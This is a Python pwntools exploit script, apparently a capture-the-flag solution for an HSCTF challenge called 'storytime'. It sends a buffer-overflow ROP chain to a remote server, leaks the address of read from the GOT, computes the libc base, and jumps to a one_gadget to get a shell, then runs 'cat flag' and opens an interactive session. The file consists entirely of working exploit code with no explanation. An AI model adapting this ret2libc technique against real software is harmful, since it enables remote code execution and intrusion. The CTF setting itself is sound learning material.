#!/usr/bin/env python

from pwn import *

p = remote('pwn.hsctf.com', 3333)
e = ELF('./storytime')
#p = process(e.path)
libc = ELF('./libc6_2.23-0ubuntu11_amd64.so')

read_got = e.got['read']
read_offset = libc.symbols['read']
pop_rsi = 0x0000000000400701 # pop rsi ; pop r15 ; ret
padding = 'A'*56
climax = e.symbols['climax']
one_gadget = 0x4526a

payload = ""
payload+= padding
payload+= p64(pop_rsi)
payload+= p64(read_got)
payload+= p64(0x3030303030303030)
payload+= p64(0x0000000000400601)
payload+= p64(0x3030303030303030)
payload+= p64(climax)

p.sendline(payload)

print p.recvuntil('Tell me a story: \n')
leak = u64(p.recv(8))

print 'Leak: '+hex(leak)

libc = leak - read_offset
print 'libc: '+hex(libc)

one_shot = one_gadget + libc
payload = ""
payload+= 'A'*56
payload+= p64(one_shot)

p.sendline(payload)
p.sendline('cat flag')
p.interactive()
# payload = ""
# payload+= padding
# payload+= p64(one_shot)
# p.sendline(payload)
# p.interactive()



